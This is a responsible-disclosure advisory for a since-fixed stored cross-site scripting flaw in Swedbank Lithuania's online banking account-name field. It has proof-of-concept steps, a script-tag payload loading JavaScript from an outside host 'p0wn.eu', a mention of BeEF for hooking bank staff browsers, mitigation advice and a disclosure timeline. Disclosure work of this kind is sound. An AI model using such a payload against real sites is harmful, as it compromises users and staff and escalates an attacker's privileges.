SWEDBANK: Stored-Cross-Site-Scripting vulnerability in Retail Banking application
=================================================================================

**Description**

A regular authenticated internet banking user has an option to set a bank’s account name to anything arbitrary with char limit of 35. The internet baking application hosted at https://www.swedbank.lt/private is vulnerable to a Stored-Cross-Site-Scripting attack in the this account name field. 
A malicious actor can set a specially crafted payload and save it to the own account. It is possible that other system’s users (banking personnel, call centre stuff etc.) who work regularly with retail clients could “find” this malicious payload while observing a specific account through routine tasks or on demand calls. This would lead to compromise other users and elevate privileges for an attacker.

**Proof-of-Concept**
Authenticate to the web application at:
https://www.swedbank.lt/private

Then open the bank’s account setting page at:
https://www.swedbank.lt/private/home/important/aliases
(pageId = private.home.important.aliases)

Then change any account name to this payload:
`A<script src=“//p0wn.eu”></script>`
And save the user input form.

*Note* To make an isolated check from external network a simple hint can be used:
Point any short domain with a name like `p0wn.eu` and write an IP resolution into the system’s `hosts` file. Then host any JS payload on the HTTPS web server.

Next a user (a victim) must visit the following page from the main menu:
```1. Privatiems▸
2. Kasdienės paslaugos▸
3. Apžvalga
```

(English)
```1. Private▸
2. Everyday banking▸
3. My finances
```
Reference url: 
https://www.swedbank.lt/private/d2d/accounts/overview
-----------------------------------------------------
Or in mobile application goto
```1. Paslaugos
2. Kitos paslaugos
3. Mano finansų apžvalga
```

(English)
```1. Services
2. Other services 
3. Summary of my finances
```

Then the payload is executed (pictures included).

The issue with unfiltered user input and fail to sanitise output in the web content can lead to high security incidents since an attacker can invoke and launch various JS scripts or JS frameworks like BeEF (The Browser Exploitation Framework https://beefproject.com/) in the context of a user or other system’s users (banking personnel, call center stuff etc.) who work regularly with retail clients.

Payload server `p0wn.eu` content:
```
HTTP/1.1 200 OK
Server: Apache
Accept-Ranges: bytes
Content-Length: 23
Connection: close
Content-Type: application/javascript

alert(document.domain);
```
**Mitigation**
Do a proper HTML Sanitisation for user input and page rendering afterwards.

Reference:
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

———————————————————
TIMELINE
2023-10-15 DISCOVERED VULNERABILITY
2023-10-16 A REPORT CREATED AND SENT TO responsible-disclosure@swedbank.com
2023-10-16 AUTOREPLY RECIEVED
2023-12-14 CONTACTED OVER LinkedIn (Head of Offensive Cyber Security at Swedbank)
2023-12-14 REPLY RECEIVED
2023-12-14 RECEIVED CONFIRMATION THAT ISSUE WAS RESOLVED
2024-01-01 Public release
———————————————————






